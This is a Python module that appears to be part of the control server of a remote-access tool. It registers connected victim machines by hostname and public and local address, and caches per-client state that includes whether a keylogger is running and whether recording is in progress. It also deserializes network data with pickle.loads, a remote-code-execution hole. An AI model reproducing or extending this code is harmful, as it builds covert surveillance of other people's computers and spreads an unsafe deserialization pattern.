from dataclasses import dataclass, field

import pickle, hashlib, os, json

from .handler import ClientWrapper
from .bucket import ConnectionBucket

@dataclass
class _clientCacheClass:
    runningKeylogger: bool = False

class ClientDevice(_clientCacheClass):
    def __init__(self, client_data: bytes, socketInstance: ClientWrapper, connectionBucket: ConnectionBucket) -> None:

        _hostname, _publib_address, _local_address = pickle.loads(client_data)
        clientUniqueID: str = hashlib.sha256(str(_hostname + _publib_address + _local_address).encode('UTF-8')).hexdigest()

        if (clientUniqueID not in [client.clientUniqueID for client in connectionBucket.connectionList]):

            if (os.path.exists(cacheName := f'clients/cache/{clientUniqueID}.json')):
                self.clientCacheData = json.loads(open(cacheName, 'r').read())
                self.__dict__ = self.clientCacheData

            else:
                json.dump(_clientCacheClass().__dict__, open(cacheName, 'w'), indent = 2)
                super().__init__()

            connectionBucket.connectionList.append(self)
            socketInstance.send_packet('0')

            self.socket: ClientWrapper = socketInstance
            self.clientUniqueID = clientUniqueID

            self.hostname: str = _hostname
            self.publib_address: str = _publib_address
            self.local_address: str = _local_address

            self.additionalData: dict = dict()
            self.stillRecording: bool = False
